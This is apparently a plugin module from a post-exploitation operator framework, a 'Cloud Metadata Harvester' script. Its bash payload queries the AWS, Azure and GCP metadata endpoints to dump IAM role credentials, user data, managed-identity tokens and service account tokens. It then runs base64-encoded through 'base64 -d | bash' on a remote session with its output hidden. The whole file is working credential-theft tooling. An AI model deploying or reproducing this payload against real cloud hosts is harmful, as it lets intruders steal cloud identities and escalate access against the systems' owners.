"""Cloud metadata service harvester."""

from ..base import OperatorScript, ScriptResult


class CloudMetadata(OperatorScript):
    """Harvest AWS/GCP/Azure metadata."""
    
    name = "Cloud Metadata Harvester"
    description = "Extract credentials from cloud metadata services"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] CLOUD METADATA HARVESTER"
echo "==========================="
echo ""

echo "[*] Testing AWS metadata (169.254.169.254)..."
if curl -s -m 2 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
    echo "[!] AWS metadata service accessible"
    echo ""
    echo "[+] Instance metadata:"
    curl -s http://169.254.169.254/latest/meta-data/instance-id
    curl -s http://169.254.169.254/latest/meta-data/hostname
    curl -s http://169.254.169.254/latest/meta-data/local-ipv4
    echo ""
    
    echo "[+] IAM role:"
    ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
    if [ -n "$ROLE" ]; then
        echo "[!] IAM Role: $ROLE"
        echo ""
        echo "[!] Credentials:"
        curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
    fi
    echo ""
    
    echo "[+] User data (may contain secrets):"
    curl -s http://169.254.169.254/latest/user-data/
    echo ""
else
    echo "[-] AWS metadata not accessible"
fi
echo ""

echo "[*] Testing Azure metadata..."
if curl -s -m 2 -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 >/dev/null 2>&1; then
    echo "[!] Azure metadata service accessible"
    curl -s -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | head -50
    echo ""
    
    echo "[+] Azure managed identity token:"
    curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
else
    echo "[-] Azure metadata not accessible"
fi
echo ""

echo "[*] Testing GCP metadata..."
if curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ >/dev/null 2>&1; then
    echo "[!] GCP metadata service accessible"
    echo ""
    echo "[+] Project info:"
    curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id
    echo ""
    
    echo "[+] Service accounts:"
    curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
    echo ""
    
    echo "[+] Default service account token:"
    curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
else
    echo "[-] GCP metadata not accessible"
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Harvesting cloud metadata...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Cloud metadata harvest executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
